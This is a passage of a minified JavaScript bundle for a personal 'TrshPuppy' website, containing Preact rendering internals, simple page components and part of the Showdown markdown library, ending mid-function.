(function(){const a=document.createElement("link").relList;if(a&&a.supports&&a.supports("modulepreload"))return;for(const p of document.querySelectorAll('link[rel="modulepreload"]'))r(p);new MutationObserver(p=>{for(const h of p)if(h.type==="childList")for(const k of h.addedNodes)k.tagName==="LINK"&&k.rel==="modulepreload"&&r(k)}).observe(document,{childList:!0,subtree:!0});function s(p){const h={};return p.integrity&&(h.integrity=p.integrity),p.referrerPolicy&&(h.referrerPolicy=p.referrerPolicy),p.crossOrigin==="use-credentials"?h.credentials="include":p.crossOrigin==="anonymous"?h.credentials="omit":h.credentials="same-origin",h}function r(p){if(p.ep)return;p.ep=!0;const h=s(p);fetch(p.href,h)}})();var ie,z,$e,Q,ke,Be,he,X={},De=[],Xe=/acit|ex(?:s|g|n|p|$)|rph|grid|ows|mnc|ntw|ine[ch]|zoo|^ord|itera/i,me=Array.isArray;function Y(t,a){for(var s in a)t[s]=a[s];return t}function Ie(t){var a=t.parentNode;a&&a.removeChild(t)}function Re(t,a,s){var r,p,h,k={};for(h in a)h=="key"?r=a[h]:h=="ref"?p=a[h]:k[h]=a[h];if(arguments.length>2&&(k.children=arguments.length>3?ie.call(arguments,2):s),typeof t=="function"&&t.defaultProps!=null)for(h in t.defaultProps)k[h]===void 0&&(k[h]=t.defaultProps[h]);return de(t,k,r,p,null)}function de(t,a,s,r,p){var h={type:t,props:a,key:s,ref:r,__k:null,__:null,__b:0,__e:null,__d:void 0,__c:null,__h:null,constructor:void 0,__v:p??++$e,__i:-1};return p==null&&z.vnode!=null&&z.vnode(h),h}function Z(t){return t.children}function ue(t,a){this.props=t,this.context=a}function x(t,a){if(a==null)return t.__?x(t.__,t.__i+1):null;for(var s;a<t.__k.length;a++)if((s=t.__k[a])!=null&&s.__e!=null)return s.__e;return typeof t.type=="function"?x(t):null}function Ue(t){var a,s;if((t=t.__)!=null&&t.__c!=null){for(t.__e=t.__c.base=null,a=0;a<t.__k.length;a++)if((s=t.__k[a])!=null&&s.__e!=null){t.__e=t.__c.base=s.__e;break}return Ue(t)}}function Pe(t){(!t.__d&&(t.__d=!0)&&Q.push(t)&&!ae.__r++||ke!==z.debounceRendering)&&((ke=z.debounceRendering)||Be)(ae)}function ae(){var t,a,s,r,p,h,k,T,S;for(Q.sort(he);t=Q.shift();)t.__d&&(a=Q.length,r=void 0,p=void 0,h=void 0,T=(k=(s=t).__v).__e,(S=s.__P)&&(r=[],p=[],(h=Y({},k)).__v=k.__v+1,ge(S,h,k,s.__n,S.ownerSVGElement!==void 0,k.__h!=null?[T]:null,r,T??x(k),k.__h,p),h.__.__k[h.__i]=h,Ve(r,h,p),h.__e!=T&&Ue(h)),Q.length>a&&Q.sort(he));ae.__r=0}function Fe(t,a,s,r,p,h,k,T,S,B,H){var _,N,A,E,M,K,$,D,V,e=0,u=r&&r.__k||De,d=u.length,n=d,o=a.length;for(s.__k=[],_=0;_<o;_++)(E=s.__k[_]=(E=a[_])==null||typeof E=="boolean"||typeof E=="function"?null:E.constructor==String||typeof E=="number"||typeof E=="bigint"?de(null,E,null,null,E):me(E)?de(Z,{children:E},null,null,null):E.__b>0?de(E.type,E.props,E.key,E.ref?E.ref:null,E.__v):E)!=null?(E.__=s,E.__b=s.__b+1,E.__i=_,(D=Je(E,u,$=_+e,n))===-1?A=X:(A=u[D]||X,u[D]=void 0,n--),ge(t,E,A,p,h,k,T,S,B,H),M=E.__e,(N=E.ref)&&A.ref!=N&&(A.ref&&be(A.ref,null,E),H.push(N,E.__c||M,E)),K==null&&M!=null&&(K=M),(V=A===X||A.__v===null)?D==-1&&e--:D!==$&&(D===$+1?e++:D>$?n>o-$?e+=D-$:e--:e=D<$&&D==$-1?D-$:0),$=_+e,typeof E.type=="function"?(D!==$||A.__k===E.__k?S=Oe(E,S,t):E.__d!==void 0?S=E.__d:M&&(S=M.nextSibling),E.__d=void 0):M&&(S=D!==$||V?We(t,M,S):M.nextSibling),typeof s.type=="function"&&(s.__d=S)):(A=u[_])&&A.key==null&&A.__e&&(A.__e==S&&(S=x(A),typeof s.type=="function"&&(s.__d=S)),_e(A,A,!1),u[_]=null);for(s.__e=K,_=d;_--;)u[_]!=null&&(typeof s.type=="function"&&u[_].__e!=null&&u[_].__e==S&&(s.__d=u[_].__e.nextSibling),_e(u[_],u[_]))}function Oe(t,a,s){for(var r,p=t.__k,h=0;p&&h<p.length;h++)(r=p[h])&&(r.__=t,a=typeof r.type=="function"?Oe(r,a,s):We(s,r.__e,a));return a}function We(t,a,s){return a!=s&&t.insertBefore(a,s||null),a.nextSibling}function Je(t,a,s,r){var p=t.key,h=t.type,k=s-1,T=s+1,S=a[s];if(S===null||S&&p==S.key&&h===S.type)return s;if(r>(S!=null?1:0))for(;k>=0||T<a.length;){if(k>=0){if((S=a[k])&&p==S.key&&h===S.type)return k;k--}if(T<a.length){if((S=a[T])&&p==S.key&&h===S.type)return T;T++}}return-1}function xe(t,a,s,r,p){var h;for(h in s)h==="children"||h==="key"||h in a||te(t,h,null,s[h],r);for(h in a)p&&typeof a[h]!="function"||h==="children"||h==="key"||h==="value"||h==="checked"||s[h]===a[h]||te(t,h,a[h],s[h],r)}function Se(t,a,s){a[0]==="-"?t.setProperty(a,s??""):t[a]=s==null?"":typeof s!="number"||Xe.test(a)?s:s+"px"}function te(t,a,s,r,p){var h;e:if(a==="style")if(typeof s=="string")t.style.cssText=s;else{if(typeof r=="string"&&(t.style.cssText=r=""),r)for(a in r)s&&a in s||Se(t.style,a,"");if(s)for(a in s)r&&s[a]===r[a]||Se(t.style,a,s[a])}else if(a[0]==="o"&&a[1]==="n")h=a!==(a=a.replace(/(PointerCapture)$|Capture$/,"$1")),a=a.toLowerCase()in t?a.toLowerCase().slice(2):a.slice(2),t.l||(t.l={}),t.l[a+h]=s,s?r?s.u=r.u:(s.u=Date.now(),t.addEventListener(a,h?Te:Ce,h)):t.removeEventListener(a,h?Te:Ce,h);else if(a!=="dangerouslySetInnerHTML"){if(p)a=a.replace(/xlink(H|:h)/,"h").replace(/sName$/,"s");else if(a!=="width"&&a!=="height"&&a!=="href"&&a!=="list"&&a!=="form"&&a!=="tabIndex"&&a!=="download"&&a!=="rowSpan"&&a!=="colSpan"&&a!=="role"&&a in t)try{t[a]=s??"";break e}catch{}typeof s=="function"||(s==null||s===!1&&a[4]!=="-"?t.removeAttribute(a):t.setAttribute(a,s))}}function Ce(t){var a=this.l[t.type+!1];if(t.t){if(t.t<=a.u)return}else t.t=Date.now();return a(z.event?z.event(t):t)}function Te(t){return this.l[t.type+!0](z.event?z.event(t):t)}function ge(t,a,s,r,p,h,k,T,S,B){var H,_,N,A,E,M,K,$,D,V,e,u,d,n,o,f=a.type;if(a.constructor!==void 0)return null;s.__h!=null&&(S=s.__h,T=a.__e=s.__e,a.__h=null,h=[T]),(H=z.__b)&&H(a);e:if(typeof f=="function")try{if($=a.props,D=(H=f.contextType)&&r[H.__c],V=H?D?D.props.value:H.__:r,s.__c?K=(_=a.__c=s.__c).__=_.__E:("prototype"in f&&f.prototype.render?a.__c=_=new f($,V):(a.__c=_=new ue($,V),_.constructor=f,_.render=dd),D&&D.sub(_),_.props=$,_.state||(_.state={}),_.context=V,_.__n=r,N=_.__d=!0,_.__h=[],_._sb=[]),_.__s==null&&(_.__s=_.state),f.getDerivedStateFromProps!=null&&(_.__s==_.state&&(_.__s=Y({},_.__s)),Y(_.__s,f.getDerivedStateFromProps($,_.__s))),A=_.props,E=_.state,_.__v=a,N)f.getDerivedStateFromProps==null&&_.componentWillMount!=null&&_.componentWillMount(),_.componentDidMount!=null&&_.__h.push(_.componentDidMount);else{if(f.getDerivedStateFromProps==null&&$!==A&&_.componentWillReceiveProps!=null&&_.componentWillReceiveProps($,V),!_.__e&&(_.shouldComponentUpdate!=null&&_.shouldComponentUpdate($,_.__s,V)===!1||a.__v===s.__v)){for(a.__v!==s.__v&&(_.props=$,_.state=_.__s,_.__d=!1),a.__e=s.__e,a.__k=s.__k,a.__k.forEach(function(i){i&&(i.__=a)}),e=0;e<_._sb.length;e++)_.__h.push(_._sb[e]);_._sb=[],_.__h.length&&k.push(_);break e}_.componentWillUpdate!=null&&_.componentWillUpdate($,_.__s,V),_.componentDidUpdate!=null&&_.__h.push(function(){_.componentDidUpdate(A,E,M)})}if(_.context=V,_.props=$,_.__P=t,_.__e=!1,u=z.__r,d=0,"prototype"in f&&f.prototype.render){for(_.state=_.__s,_.__d=!1,u&&u(a),H=_.render(_.props,_.state,_.context),n=0;n<_._sb.length;n++)_.__h.push(_._sb[n]);_._sb=[]}else do _.__d=!1,u&&u(a),H=_.render(_.props,_.state,_.context),_.state=_.__s;while(_.__d&&++d<25);_.state=_.__s,_.getChildContext!=null&&(r=Y(Y({},r),_.getChildContext())),N||_.getSnapshotBeforeUpdate==null||(M=_.getSnapshotBeforeUpdate(A,E)),Fe(t,me(o=H!=null&&H.type===Z&&H.key==null?H.props.children:H)?o:[o],a,s,r,p,h,k,T,S,B),_.base=a.__e,a.__h=null,_.__h.length&&k.push(_),K&&(_.__E=_.__=null)}catch(i){a.__v=null,S||h!=null?(a.__e=T,a.__h=!!S,h[h.indexOf(T)]=null):(a.__e=s.__e,a.__k=s.__k),z.__e(i,a,s)}else h==null&&a.__v===s.__v?(a.__k=s.__k,a.__e=s.__e):a.__e=ed(s.__e,a,s,r,p,h,k,S,B);(H=z.diffed)&&H(a)}function Ve(t,a,s){a.__d=void 0;for(var r=0;r<s.length;r++)be(s[r],s[++r],s[++r]);z.__c&&z.__c(a,t),t.some(function(p){try{t=p.__h,p.__h=[],t.some(function(h){h.call(p)})}catch(h){z.__e(h,p.__v)}})}function ed(t,a,s,r,p,h,k,T,S){var B,H,_,N=s.props,A=a.props,E=a.type,M=0;if(E==="svg"&&(p=!0),h!=null){for(;M<h.length;M++)if((B=h[M])&&"setAttribute"in B==!!E&&(E?B.localName===E:B.nodeType===3)){t=B,h[M]=null;break}}if(t==null){if(E===null)return document.createTextNode(A);t=p?document.createElementNS("http://www.w3.org/2000/svg",E):document.createElement(E,A.is&&A),h=null,T=!1}if(E===null)N===A||T&&t.data===A||(t.data=A);else{if(h=h&&ie.call(t.childNodes),H=(N=s.props||X).dangerouslySetInnerHTML,_=A.dangerouslySetInnerHTML,!T){if(h!=null)for(N={},M=0;M<t.attributes.length;M++)N[t.attributes[M].name]=t.attributes[M].value;(_||H)&&(_&&(H&&_.__html==H.__html||_.__html===t.innerHTML)||(t.innerHTML=_&&_.__html||""))}if(xe(t,A,N,p,T),_)a.__k=[];else if(Fe(t,me(M=a.props.children)?M:[M],a,s,r,p&&E!=="foreignObject",h,k,h?h[0]:s.__k&&x(s,0),T,S),h!=null)for(M=h.length;M--;)h[M]!=null&&Ie(h[M]);T||("value"in A&&(M=A.value)!==void 0&&(M!==t.value||E==="progress"&&!M||E==="option"&&M!==N.value)&&te(t,"value",M,N.value,!1),"checked"in A&&(M=A.checked)!==void 0&&M!==t.checked&&te(t,"checked",M,N.checked,!1))}return t}function be(t,a,s){try{typeof t=="function"?t(a):t.current=a}catch(r){z.__e(r,s)}}function _e(t,a,s){var r,p;if(z.unmount&&z.unmount(t),(r=t.ref)&&(r.current&&r.current!==t.__e||be(r,null,a)),(r=t.__c)!=null){if(r.componentWillUnmount)try{r.componentWillUnmount()}catch(h){z.__e(h,a)}r.base=r.__P=null,t.__c=void 0}if(r=t.__k)for(p=0;p<r.length;p++)r[p]&&_e(r[p],a,s||typeof t.type!="function");s||t.__e==null||Ie(t.__e),t.__=t.__e=t.__d=void 0}function dd(t,a,s){return this.constructor(t,s)}function ud(t,a,s){var r,p,h,k;z.__&&z.__(t,a),p=(r=typeof s=="function")?null:s&&s.__k||a.__k,h=[],k=[],ge(a,t=(!r&&s||a).__k=Re(Z,null,[t]),p||X,X,a.ownerSVGElement!==void 0,!r&&s?[s]:p?null:a.firstChild?ie.call(a.childNodes):null,h,!r&&s?s:p?p.__e:a.firstChild,r,k),Ve(h,t,k)}ie=De.slice,z={__e:function(t,a,s,r){for(var p,h,k;a=a.__;)if((p=a.__c)&&!p.__)try{if((h=p.constructor)&&h.getDerivedStateFromError!=null&&(p.setState(h.getDerivedStateFromError(t)),k=p.__d),p.componentDidCatch!=null&&(p.componentDidCatch(t,r||{}),k=p.__d),k)return p.__E=p}catch(T){t=T}throw t}},$e=0,ue.prototype.setState=function(t,a){var s;s=this.__s!=null&&this.__s!==this.state?this.__s:this.__s=Y({},this.state),typeof t=="function"&&(t=t(Y({},s),this.props)),t&&Y(s,t),t!=null&&this.__v&&(a&&this._sb.push(a),Pe(this))},ue.prototype.forceUpdate=function(t){this.__v&&(this.__e=!0,t&&this.__h.push(t),Pe(this))},ue.prototype.render=Z,Q=[],Be=typeof Promise=="function"?Promise.prototype.then.bind(Promise.resolve()):setTimeout,he=function(t,a){return t.__v.__b-a.__v.__b},ae.__r=0;var ee,I,le,Ee,ce=0,Ge=[],re=[],je=z.__b,ze=z.__r,Me=z.diffed,Ae=z.__c,Le=z.unmount;function we(t,a){z.__h&&z.__h(I,t,ce||a),ce=0;var s=I.__H||(I.__H={__:[],__h:[]});return t>=s.__.length&&s.__.push({__V:re}),s.__[t]}function qe(t){return ce=1,rd(Ye,t)}function rd(t,a,s){var r=we(ee++,2);if(r.t=t,!r.__c&&(r.__=[s?s(a):Ye(void 0,a),function(T){var S=r.__N?r.__N[0]:r.__[0],B=r.t(S,T);S!==B&&(r.__N=[B,r.__[1]],r.__c.setState({}))}],r.__c=I,!I.u)){var p=function(T,S,B){if(!r.__c.__H)return!0;var H=r.__c.__H.__.filter(function(N){return N.__c});if(H.every(function(N){return!N.__N}))return!h||h.call(this,T,S,B);var _=!1;return H.forEach(function(N){if(N.__N){var A=N.__[0];N.__=N.__N,N.__N=void 0,A!==N.__[0]&&(_=!0)}}),!(!_&&r.__c.props===T)&&(!h||h.call(this,T,S,B))};I.u=!0;var h=I.shouldComponentUpdate,k=I.componentWillUpdate;I.componentWillUpdate=function(T,S,B){if(this.__e){var H=h;h=void 0,p(T,S,B),h=H}k&&k.call(this,T,S,B)},I.shouldComponentUpdate=p}return r.__N||r.__}function Ze(t,a){var s=we(ee++,3);!z.__s&&Ke(s.__H,a)&&(s.__=t,s.i=a,I.__H.__h.push(s))}function He(t){return ce=5,nd(function(){return{current:t}},[])}function nd(t,a){var s=we(ee++,7);return Ke(s.__H,a)?(s.__V=t(),s.i=a,s.__h=t,s.__V):s.__}function ad(){for(var t;t=Ge.shift();)if(t.__P&&t.__H)try{t.__H.__h.forEach(ne),t.__H.__h.forEach(pe),t.__H.__h=[]}catch(a){t.__H.__h=[],z.__e(a,t.__v)}}z.__b=function(t){I=null,je&&je(t)},z.__r=function(t){ze&&ze(t),ee=0;var a=(I=t.__c).__H;a&&(le===I?(a.__h=[],I.__h=[],a.__.forEach(function(s){s.__N&&(s.__=s.__N),s.__V=re,s.__N=s.i=void 0})):(a.__h.forEach(ne),a.__h.forEach(pe),a.__h=[],ee=0)),le=I},z.diffed=function(t){Me&&Me(t);var a=t.__c;a&&a.__H&&(a.__H.__h.length&&(Ge.push(a)!==1&&Ee===z.requestAnimationFrame||((Ee=z.requestAnimationFrame)||td)(ad)),a.__H.__.forEach(function(s){s.i&&(s.__H=s.i),s.__V!==re&&(s.__=s.__V),s.i=void 0,s.__V=re})),le=I=null},z.__c=function(t,a){a.some(function(s){try{s.__h.forEach(ne),s.__h=s.__h.filter(function(r){return!r.__||pe(r)})}catch(r){a.some(function(p){p.__h&&(p.__h=[])}),a=[],z.__e(r,s.__v)}}),Ae&&Ae(t,a)},z.unmount=function(t){Le&&Le(t);var a,s=t.__c;s&&s.__H&&(s.__H.__.forEach(function(r){try{ne(r)}catch(p){a=p}}),s.__H=void 0,a&&z.__e(a,s.__v))};var Ne=typeof requestAnimationFrame=="function";function td(t){var a,s=function(){clearTimeout(r),Ne&&cancelAnimationFrame(a),setTimeout(t)},r=setTimeout(s,100);Ne&&(a=requestAnimationFrame(s))}function ne(t){var a=I,s=t.__c;typeof s=="function"&&(t.__c=void 0,s()),I=a}function pe(t){var a=I;t.__c=t.__(),I=a}function Ke(t,a){return!t||t.length!==a.length||a.some(function(s,r){return s!==t[r]})}function Ye(t,a){return typeof a=="function"?a(t):a}var cd=0;function P(t,a,s,r,p,h){var k,T,S={};for(T in a)T=="ref"?k=a[T]:S[T]=a[T];var B={type:t,props:S,key:s,ref:k,__k:null,__:null,__b:0,__e:null,__d:void 0,__c:null,__h:null,constructor:void 0,__v:--cd,__i:-1,__source:p,__self:h};if(typeof t=="function"&&(k=t.defaultProps))for(T in k)S[T]===void 0&&(S[T]=k[T]);return z.vnode&&z.vnode(B),B}function id(t){return P("nav",{id:"main-nav",children:[P("div",{id:"logo-div",children:P("a",{children:P("img",{id:"home-btn",src:"./logo2.png",alt:"TrshPuppy logo",style:"image-rendering: pixelated"})})}),P("menu",{id:"main-nav-menu",children:[P("a",{children:P("button",{id:"portfolio-btn",type:"button",children:"Portfolio"})}),P("a",{children:P("button",{id:"about-btn",type:"button",children:"About"})}),P("a",{children:P("button",{id:"contact-btn",type:"button",children:"Contact"})})]})]})}function J(t){const a=t.chillins,s=t.orientation,r=[];for(let p of a)if(p.type=="section")r.push(p.element);else{let h=Re(p.type,p.attrs,p.text||p.child);r.push(h)}return P("div",{className:`section-${s} section-${t.tag}`,children:r})}function od(t){const a=t.handleClickCB;return P(Z,{children:[P("div",{className:"content-stack-top",id:"home-stack-top",children:[P("h1",{children:"Welcome to my Trash Heap!"}),P(J,{tag:"welcome",orientation:"row",chillins:[{type:"p",attrs:void 0,text:"We are currently under construction!",child:void 0},{type:"img",attrs:{class:"welcome-pic",src:"./trash-puppy.gif",alt:"Trash Puppy Gif"},text:void 0,child:void 0}]})]}),P("div",{className:"content-stack-2",id:"home-stack-2",children:[P(J,{tag:"stack-2",orientation:"column",chillins:[{type:"h2",attrs:{class:"context"},text:"Here is some trash to sift through:",child:void 0},{type:"p",attrs:void 0,text:"You may find some treasures!",child:void 0}]}),P("div",{className:"linkbox-container",id:"home-linkbox-container",children:[P(J,{tag:"linkbox-btn",orientation:"column",chillins:[{type:"p",attrs:void 0,text:"Portfolio",child:void 0},{type:"a",attrs:{id:"portfolio-linkbox"},text:void 0,child:P("button",{onClick:a,type:"button",children:P("img",{className:"home-linkbox-img",id:"paper-gif",src:"./paper.gif",alt:"Trash Puppy Paper GIF"})})}]}),P(J,{tag:"linkbox-btn",orientation:"column",chillins:[{type:"p",attrs:void 0,text:"About",child:void 0},{type:"a",attrs:{id:"about-linkbox"},text:void 0,child:P("button",{onClick:a,type:"button",children:P("img",{className:"home-linkbox-img",id:"tp-wag-gif",src:"./tp-wag.gif",alt:"Trash Puppy Happy GIF"})})}]}),P(J,{tag:"linkbox-btn",orientation:"column",chillins:[{type:"p",attrs:void 0,text:"Contact",child:void 0},{type:"a",attrs:{id:"contact-linkbox"},text:void 0,child:P("button",{onClick:a,type:"button",children:P("img",{className:"home-linkbox-img",id:"star-gif",src:"./star.gif",alt:"Trash Puppy Pant GIF"})})}]})]})]})]})}function sd(){return P("div",{children:"About"})}var fd=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},Qe={exports:{}};(function(t){(function(){function a(e){var u={omitExtraWLInCodeBlocks:{defaultValue:!1,describe:"Omit the default extra whiteline added to code blocks",type:"boolean"},noHeaderId:{defaultValue:!1,describe:"Turn on/off generated header id",type:"boolean"},prefixHeaderId:{defaultValue:!1,describe:"Add a prefix to the generated header ids. Passing a string will prefix that string to the header id. Setting to true will add a generic 'section-' prefix",type:"string"},rawPrefixHeaderId:{defaultValue:!1,describe:'Setting this option to true will prevent showdown from modifying the prefix. This might result in malformed IDs (if, for instance, the " char is used in the prefix)',type:"boolean"},ghCompatibleHeaderId:{defaultValue:!1,describe:"Generate header ids compatible with github style (spaces are replaced with dashes, a bunch of non alphanumeric chars are removed)",type:"boolean"},rawHeaderId:{defaultValue:!1,describe:`Remove only spaces, ' and " from generated header ids (including prefixes), replacing them with dashes (-). WARNING: This might result in malformed ids`,type:"boolean"},headerLevelStart:{defaultValue:!1,describe:"The header blocks level start",type:"integer"},parseImgDimensions:{defaultValue:!1,describe:"Turn on/off image dimension parsing",type:"boolean"},simplifiedAutoLink:{defaultValue:!1,describe:"Turn on/off GFM autolink style",type:"boolean"},excludeTrailingPunctuationFromURLs:{defaultValue:!1,describe:"Excludes trailing punctuation from links generated with autoLinking",type:"boolean"},literalMidWordUnderscores:{defaultValue:!1,describe:"Parse midword underscores as literal underscores",type:"boolean"},literalMidWordAsterisks:{defaultValue:!1,describe:"Parse midword asterisks as literal asterisks",type:"boolean"},strikethrough:{defaultValue:!1,describe:"Turn on/off strikethrough support",type:"boolean"},tables:{defaultValue:!1,describe:"Turn on/off tables support",type:"boolean"},tablesHeaderId:{defaultValue:!1,describe:"Add an id to table headers",type:"boolean"},ghCodeBlocks:{defaultValue:!0,describe:"Turn on/off GFM fenced code blocks support",type:"boolean"},tasklists:{defaultValue:!1,describe:"Turn on/off GFM tasklist support",type:"boolean"},smoothLivePreview:{defaultValue:!1,describe:"Prevents weird effects in live previews due to incomplete input",type:"boolean"},smartIndentationFix:{defaultValue:!1,describe:"Tries to smartly fix indentation in es6 strings",type:"boolean"},disableForced4SpacesIndentedSublists:{defaultValue:!1,describe:"Disables the requirement of indenting nested sublists by 4 spaces",type:"boolean"},simpleLineBreaks:{defaultValue:!1,describe:"Parses simple line breaks as <br> (GFM Style)",type:"boolean"},requireSpaceBeforeHeadingText:{defaultValue:!1,describe:"Makes adding a space between `#` and the header text mandatory (GFM Style)",type:"boolean"},ghMentions:{defaultValue:!1,describe:"Enables github @mentions",type:"boolean"},ghMentionsLink:{defaultValue:"https://github.com/{u}",describe:"Changes the link generated by @mentions. Only applies if ghMentions option is enabled.",type:"string"},encodeEmails:{defaultValue:!0,describe:"Encode e-mail addresses through the use of Character Entities, transforming ASCII e-mail addresses into its equivalent decimal entities",type:"boolean"},openLinksInNewWindow:{defaultValue:!1,describe:"Open all links in new windows",type:"boolean"},backslashEscapesHTMLTags:{defaultValue:!1,describe:"Support for HTML Tag escaping. ex: <div>foo</div>",type:"boolean"},emoji:{defaultValue:!1,describe:"Enable emoji support. Ex: `this is a :smile: emoji`",type:"boolean"},underline:{defaultValue:!1,describe:"Enable support for underline. Syntax is double or triple underscores: `__underline word__`. With this option enabled, underscores no longer parses into `<em>` and `<strong>`",type:"boolean"},ellipsis:{defaultValue:!0,describe:"Replaces three dots with the ellipsis unicode character",type:"boolean"},completeHTMLDocument:{defaultValue:!1,describe:"Outputs a complete html document, including `<html>`, `<head>` and `<body>` tags",type:"boolean"},metadata:{defaultValue:!1,describe:"Enable support for document metadata (defined at the top of the document between `«««` and `»»»` or between `---` and `---`).",type:"boolean"},splitAdjacentBlockquotes:{defaultValue:!1,describe:"Split adjacent blockquote blocks",type:"boolean"}};if(e===!1)return JSON.parse(JSON.stringify(u));var d={};for(var n in u)u.hasOwnProperty(n)&&(d[n]=u[n].defaultValue);return d}function s(){var e=a(!0),u={};for(var d in e)e.hasOwnProperty(d)&&(u[d]=!0);return u}var r={},p={},h={},k=a(!0),T="vanilla",S={github:{omitExtraWLInCodeBlocks:!0,simplifiedAutoLink:!0,excludeTrailingPunctuationFromURLs:!0,literalMidWordUnderscores:!0,strikethrough:!0,tables:!0,tablesHeaderId:!0,ghCodeBlocks:!0,tasklists:!0,disableForced4SpacesIndentedSublists:!0,simpleLineBreaks:!0,requireSpaceBeforeHeadingText:!0,ghCompatibleHeaderId:!0,ghMentions:!0,backslashEscapesHTMLTags:!0,emoji:!0,splitAdjacentBlockquotes:!0},original:{noHeaderId:!0,ghCodeBlocks:!1},ghost:{omitExtraWLInCodeBlocks:!0,parseImgDimensions:!0,simplifiedAutoLink:!0,excludeTrailingPunctuationFromURLs:!0,literalMidWordUnderscores:!0,strikethrough:!0,tables:!0,tablesHeaderId:!0,ghCodeBlocks:!0,tasklists:!0,smoothLivePreview:!0,simpleLineBreaks:!0,requireSpaceBeforeHeadingText:!0,ghMentions:!1,encodeEmails:!0},vanilla:a(!0),allOn:s()};r.helper={},r.extensions={},r.setOption=function(e,u){return k[e]=u,this},r.getOption=function(e){return k[e]},r.getOptions=function(){return k},r.resetOptions=function(){k=a(!0)},r.setFlavor=function(e){if(!S.hasOwnProperty(e))throw Error(e+" flavor was not found");r.resetOptions();var u=S[e];T=e;for(var d in u)u.hasOwnProperty(d)&&(k[d]=u[d])},r.getFlavor=function(){return T},r.getFlavorOptions=function(e){if(S.hasOwnProperty(e))return S[e]},r.getDefaultOptions=function(e){return a(e)},r.subParser=function(e,u){if(r.helper.isString(e))if(typeof u<"u")p[e]=u;else{if(p.hasOwnProperty(e))return p[e];throw Error("SubParser named "+e+" not registered!")}},r.extension=function(e,u){if(!r.helper.isString(e))throw Error("Extension 'name' must be a string");if(e=r.helper.stdExtName(e),r.helper.isUndefined(u)){if(!h.hasOwnProperty(e))throw Error("Extension named "+e+" is not registered!");return h[e]}else{typeof u=="function"&&(u=u()),r.helper.isArray(u)||(u=[u]);var d=B(u,e);if(d.valid)h[e]=u;else throw Error(d.error)}},r.getAllExtensions=function(){return h},r.removeExtension=function(e){delete h[e]},r.resetExtensions=function(){h={}};function B(e,u){var d=u?"Error in "+u+" extension->":"Error in unnamed extension",n={valid:!0,error:""};r.helper.isArray(e)||(e=[e]);for(var o=0;o<e.length;++o){var f=d+" sub-extension "+o+": ",i=e[o];if(typeof i!="object")return n.valid=!1,n.error=f+"must be an object, but "+typeof i+" given",n;if(!r.helper.isString(i.type))return n.valid=!1,n.error=f+'property "type" must be a string, but '+typeof i.type+" given",n;var l=i.type=i.type.toLowerCase();if(l==="language"&&(l=i.type="lang"),l==="html"&&(l=i.type="output"),l!=="lang"&&l!=="output"&&l!=="listener")return n.valid=!1,n.error=f+"type "+l+' is not recognized. Valid values: "lang/language", "output/html" or "listener"',n;if(l==="listener"){if(r.helper.isUndefined(i.listeners))return n.valid=!1,n.error=f+'. Extensions of type "listener" must have a property called "listeners"',n}else if(r.helper.isUndefined(i.filter)&&r.helper.isUndefined(i.regex))return n.valid=!1,n.error=f+l+' extensions must define either a "regex" property or a "filter" method',n;if(i.listeners){if(typeof i.listeners!="object")return n.valid=!1,n.error=f+'"listeners" property must be an object but '+typeof i.listeners+" given",n;for(var y in i.listeners)if(i.listeners.hasOwnProperty(y)&&typeof i.listeners[y]!="function")return n.valid=!1,n.error=f+'"listeners" property must be an hash of [event name]: [callback]. listeners.'+y+" must be a function but "+typeof i.listeners[y]+" given",n}if(i.filter){if(typeof i.filter!="function")return n.valid=!1,n.error=f+'"filter" must be a function, but '+typeof i.filter+" given",n}else if(i.regex){if(r.helper.isString(i.regex)&&(i.regex=new RegExp(i.regex,"g")),!(i.regex instanceof RegExp))return n.valid=!1,n.error=f+'"regex" property must either be a string or a RegExp object, but '+typeof i.regex+" given",n;if(r.helper.isUndefined(i.replace))return n.valid=!1,n.error=f+'"regex" extensions must implement a replace string or function',n}}return n}r.validateExtension=function(e){var u=B(e,null);return u.valid?!0:(console.warn(u.error),!1)},r.hasOwnProperty("helper")||(r.helper={}),r.helper.isString=function(e){return typeof e=="string"||e instanceof String},r.helper.isFunction=function(e){var u={};return e&&u.toString.call(e)==="[object Function]"},r.helper.isArray=function(e){return Array.isArray(e)},r.helper.isUndefined=function(e){return typeof e>"u"},r.helper.forEach=function(e,u){if(r.helper.isUndefined(e))throw new Error("obj param is required");if(r.helper.isUndefined(u))throw new Error("callback param is required");if(!r.helper.isFunction(u))throw new Error("callback param must be a function/closure");if(typeof e.forEach=="function")e.forEach(u);else if(r.helper.isArray(e))for(var d=0;d<e.length;d++)u(e[d],d,e);else if(typeof e=="object")for(var n in e)e.hasOwnProperty(n)&&u(e[n],n,e);else throw new Error("obj does not seem to be an array or an iterable object")},r.helper.stdExtName=function(e){return e.replace(/[_?*+\/\\.^-]/g,"").replace(/\s/g,"").toLowerCase()};function H(e,u){var d=u.charCodeAt(0);return"¨E"+d+"E"}r.helper.escapeCharactersCallback=H,r.helper.escapeCharacters=function(e,u,d){var n="(["+u.replace(/([\[\]\\])/g,"\\$1")+"])";d&&(n="\\\\"+n);var o=new RegExp(n,"g");return e=e.replace(o,H),e},r.helper.unescapeHTMLEntities=function(e){return e.replace(/&quot;/g,'"').replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&amp;/g,"&")};var _=function(e,u,d,n){var o=n||"",f=o.indexOf("g")>-1,i=new RegExp(u+"|"+d,"g"+o.replace(/g/g,"")),l=new RegExp(u,o.replace(/g/g,"")),y=[],b,g,w,c,m;do for(b=0;w=i.exec(e);)if(l.test(w[0]))b++||(g=i.lastIndex,c=g-w[0].length);else if(b&&!--b){m=w.index+w[0].length;var v={left:{start:c,end:g},match:{start:g,end:w.index},right:{start:w.index,end:m},wholeMatch:{start:c,end:m}};if(y.push(v),!f)return y}while(b&&(i.lastIndex=g));return y};r.helper.matchRecursiveRegExp=function(e,u,d,n){for(var o=_(e,u,d,n),f=[],i=0;i<o.length;++i)f.push([e.slice(o[i].wholeMatch.start,o[i].wholeMatch.end),e.slice(o[i].match.start,o[i].match.end),e.slice(o[i].left.start,o[i].left.end),e.slice(o[i].right.start,o[i].right.end)]);return f},r.helper.replaceRecursiveRegExp=function(e,u,d,n,o){if(!r.helper.isFunction(u)){var f=u;u=function(){return f}}var i=_(e,d,n,o),l=e,y=i.length;if(y>0){var b=[];i[0].wholeMatch.start!==0&&b.push(e.slice(0,i[0].wholeMatch.start));for(var 